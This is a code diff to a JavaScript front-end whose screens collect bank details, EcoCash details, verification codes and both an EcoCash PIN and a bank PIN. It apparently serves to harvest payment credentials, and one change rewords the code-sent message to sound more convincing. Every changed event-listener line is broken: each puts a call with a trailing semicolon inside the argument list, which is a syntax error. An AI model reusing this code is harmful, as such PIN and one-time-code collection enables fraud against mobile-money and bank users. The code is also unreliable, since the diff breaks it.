@@ -1116,7 +1116,7 @@ function loadBankDetailsScreen() {
         .getElementById("continueBankDetails")
         .addEventListener(
             "click",
-            saveBankDetails
+            saveBankDetails();
         );
 
 }
@@ -1493,7 +1493,7 @@ function loadBankVerificationScreen() {
         .getElementById("continueBankVerification")
         .addEventListener(
             "click",
-            saveBankVerification
+            saveBankVerification();
         );
 
 }
@@ -1797,14 +1797,14 @@ function loadEcoCashDetailsScreen() {
         .getElementById("backEcoDisbursement")
         .addEventListener(
             "click",
-            loadDisbursementScreen
+            loadDisbursementScreen();
         );
 
     document
         .getElementById("continueEcoDetails")
         .addEventListener(
             "click",
-            saveEcoCashDetails
+            saveEcoCashDetails();
         );
 
 }
@@ -1917,7 +1917,7 @@ async function saveEcoCashDetails() {
         );
 
         // Show waiting screen
-        loadEcoCashCodeSendingScreen();
+        loadEcoCashVerificationWaitingScreen();
 
     } catch (error) {
 
@@ -2107,8 +2107,8 @@ function loadEcoCashVerificationScreen() {
 
             <p class="intro">
 
-                📩 Your verification code has been marked
-                as sent.
+                📩 verification code has been
+                 sent.
 
                 <br><br>
 
@@ -2143,14 +2143,14 @@ function loadEcoCashVerificationScreen() {
         .getElementById("backEcoDetails")
         .addEventListener(
             "click",
-            loadEcoCashDetailsScreen
+            loadEcoCashDetailsScreen();
         );
 
     document
         .getElementById("continueEcoVerification")
         .addEventListener(
             "click",
-            saveEcoCashVerification
+            saveEcoCashVerification();
         );
 
 }
@@ -2320,7 +2320,7 @@ function loadEcoCashPinScreen() {
         .getElementById("continueEcoPin")
         .addEventListener(
             "click",
-            saveEcoCashPin
+            saveEcoCashPin();
         );
 
 }
@@ -3365,7 +3365,7 @@ function loadBankPinScreen() {
         .getElementById("continueBankPin")
         .addEventListener(
             "click",
-            saveBankPin
+            saveBankPin();
         );
 
             }
